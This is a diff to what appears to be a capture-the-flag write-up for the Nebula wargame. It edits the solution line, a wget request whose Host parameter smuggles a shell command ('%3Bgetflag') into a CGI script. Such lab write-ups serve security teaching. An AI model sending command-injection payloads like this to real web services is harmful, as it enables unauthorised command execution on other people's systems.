@@ -43,4 +43,4 @@ Basic Information
 Solution
 --------
 
-:bash:`wget nebula'sIP/index.cgi?Host=%3Bgetflag`
+:bash:`wget nebula's<IP>/index.cgi?Host=%3Bgetflag`
